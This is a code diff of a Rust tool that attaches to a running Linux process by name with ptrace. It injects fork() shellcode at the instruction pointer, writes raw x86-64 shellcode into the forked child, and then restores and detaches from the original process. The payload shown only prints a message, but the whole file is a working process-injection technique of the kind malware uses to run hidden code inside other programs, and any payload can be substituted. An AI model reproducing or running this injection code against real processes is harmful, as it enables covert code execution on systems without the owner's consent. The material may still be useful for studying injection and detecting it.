@@ -2,15 +2,20 @@
 
 use sysinfo::System;
 use std::ffi::{OsStr, c_void};
-use nix::{sys::{ptrace::{self, attach, cont, detach, getregs, setregs, write, AddressType}, wait::waitpid}, unistd::Pid};
+use nix::{sys::{ptrace::{self, attach, cont, detach, getevent, getregs, setoptions, setregs, write, AddressType, Options}, wait::waitpid}, unistd::Pid};
 
-// Shellcode prints "Injected: ar.p"
-// Having no exit syscall 
-const SHELLCODE: [u8; 52] = [
-                                0xb8, 0x01, 0x00, 0x00, 0x00, 0x48, 0xbe, 0x49, 0x6e, 0x6a, 0x65, 0x63, 0x74, 0x65, 0x64, 0x56, 0x48,
-                                0x89, 0xe6, 0xba, 0x08, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x48, 0xbe, 0x3a,
-                                0x20, 0x61, 0x72, 0x2e, 0x70, 0x00, 0x00, 0x56, 0x48, 0x89, 0xe6, 0xba, 0x06, 0x00, 0x00, 0x00, 0x0f, 0x05,    
-                            ];
+// Shellcode that prints "Injected: ar.p"
+const PAYLOAD: [u8; 59] = [
+                                0xb8, 0x01, 0x00, 0x00, 0x00, 0x48, 0xbe, 0x49, 0x6e, 0x6a, 
+                                0x65, 0x63, 0x74, 0x65, 0x64, 0x56, 0x48, 0x89, 0xe6, 0xba, 
+                                0x08, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x01, 0x00, 0x00, 
+                                0x00, 0x48, 0xbe, 0x3a, 0x20, 0x61, 0x72, 0x2e, 0x70, 0x00, 
+                                0x00, 0x56, 0x48, 0x89, 0xe6, 0xba, 0x06, 0x00, 0x00, 0x00, 
+                                0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05    
+                           ];
+
+//fork syscall
+const FORK: [u8; 7] = [0x48, 0x31, 0xc0, 0xb0, 0x39, 0x0f, 0x05];
 
 
 pub fn getPID(pname: String) { 
@@ -31,52 +36,56 @@ pub fn getPID(pname: String) {
 
 fn THREAD(pid: i32, pname: String) {
     
-    // Converting pid::i32 to unistd::Pid
     let pid = Pid::from_raw(pid);
 
-    // Attaching to Process 
     attach(pid).unwrap();
-    println!("Attaching on {:?} PID: {}", pname, pid);
+    println!("[>] Attaching on {:?} PID: ({})", pname, pid); 
 
-    // Wait for Signal
     waitpid(pid, None).unwrap();
+    setoptions(pid, Options::PTRACE_O_TRACEFORK).unwrap();
+
+    println!("[>] Getting the original registers");
+    let regs = getregs(pid).unwrap(); 
+
+    let rip = regs.rip;
+    let instruction = ptrace::read(pid, rip as AddressType).unwrap();
+
+    println!("\t+ Injecting fork() shellcode into {:?}", pname); 
+    memINJECT(pid, rip, &FORK);
+   
+    ptrace::cont(pid, None).unwrap();
+    waitpid(pid, None).unwrap();
+
+    println!("\t+ fork() shellcode executed successfully");
+    let cpid = Pid::from_raw(getevent(pid).unwrap() as i32);
+
+    waitpid(cpid, None).unwrap();
+    let crip = getregs(cpid).unwrap().rip;
+
+    println!("\t+ Injecting Payload into Child Process CPID: ({})", cpid); 
+    memINJECT(cpid, crip, &PAYLOAD);
     
-    // Get original registers and original instruction
-    let regs = ptrace::getregs(pid).unwrap();
-    let original_instruction = ptrace::read(pid, regs.rip as *mut c_void).unwrap();
-
-    // Performing memory injection 
-    memINJECT(pid);
-
-    // Continue the process
     cont(pid, None).unwrap();
     waitpid(pid, None).unwrap();
 
-    // Restoring the original instruction
-    unsafe{ ptrace::write(pid, regs.rip as *mut c_void, original_instruction as *mut c_void).unwrap() };
-    setregs(pid, regs).expect("Failed to set registers");
-    println!("{:?} process is restored sucessfully.", pname);
+    unsafe {write(pid, regs.rip as AddressType, instruction as *mut c_void).unwrap()};
+    setregs(pid, regs).unwrap();
+    println!("[>] {:?} process restored successfully", pname);   
 
-    // Detach with no signal 
     detach(pid, None).unwrap();
-    println!("Detach from PID: {}", pid);
+    println!("[>] Detach from PID: ({})", pid);
 
 }
 
 
-fn memINJECT(pid: Pid) {
+fn memINJECT(pid: Pid, rip: u64, shellcode: &[u8]) {
     
-    // Getting register
-    let mut rip = getregs(pid).unwrap().rip as u64;
-    println!("Hijacking at RIP: {:#x}", rip);
+    let mut addr = rip;
+    println!("\t+ Hijacking RIP: {:#x}", rip);
     
-    // Writing Shellcode to Process
-    for byte in SHELLCODE.iter() {
-        let data = *byte as *mut c_void;
-        unsafe{ write(pid, rip as AddressType, data).unwrap(); }
-        rip += 1;
+    for byte in shellcode.iter() {
+        unsafe{ write(pid, addr as AddressType, *byte as *mut c_void).unwrap(); }
+        addr += 1;
     }
-    
-    println!("!!! Shellcode injected !!!");
 
 }
